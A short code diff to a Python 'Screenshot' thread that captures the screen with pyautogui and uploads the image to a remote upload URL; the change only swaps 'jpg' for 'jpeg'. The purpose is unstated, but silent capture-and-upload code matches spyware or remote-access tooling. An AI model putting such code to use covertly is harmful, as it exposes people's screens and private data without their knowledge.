@@ -23,10 +23,10 @@ class Screenshot(threading.Thread):
                     # Take screenshot
                     pic = pyautogui.screenshot()
                     # Save the image
-                    file_name = 'Screenshot.jpg'
+                    file_name = 'Screenshot.jpeg'
                     pic.save(file_name)
                     with open(file_name, "rb") as image_file:
-                        files = {'file': (file_name, image_file, 'image/jpg', {'Expires': '0'})}
+                        files = {'file': (file_name, image_file, 'image/jpeg', {'Expires': '0'})}
                         upload = response.json()
                         upload_screenshot = requests.post(upload['url'], data=upload['fields'], files=files)
                         print('screen shot uploaded!')
